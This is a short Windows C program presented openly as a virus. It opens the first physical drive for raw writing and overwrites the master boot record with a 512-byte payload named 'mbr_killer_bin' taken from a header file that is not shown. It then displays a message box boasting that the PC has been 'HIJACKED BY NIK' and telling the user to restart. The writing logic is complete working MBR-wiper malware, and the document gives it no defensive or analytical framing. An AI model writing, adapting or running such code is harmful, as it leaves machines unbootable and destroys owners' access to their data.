#include <windows.h>
#include "virus_data.h"

int main() {
    Sleep(1200);

    if (mbr_killer_bin_len != 512) {
        MessageBoxA(0, "Size Error!", "ERROR", MB_ICONERROR);
        return 1;
    }

    HANDLE h = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        MessageBoxA(0, "Run as Admin!", "ERROR", MB_ICONERROR);
        return 1;
    }

    DWORD written;
    WriteFile(h, mbr_killer_bin, 512, &written, NULL);
    CloseHandle(h);

    MessageBoxA(0,
        "========================================\n"
        "   KILLER VIRUS INJECTED!\n"
        "   PC HIJACKED BY NIK!\n"
        "   \n"
        "   AB KHUD RESTART KARO!\n"
        "========================================\n",
        "NIK HIJACKED!", MB_ICONWARNING);

    return 0;
}
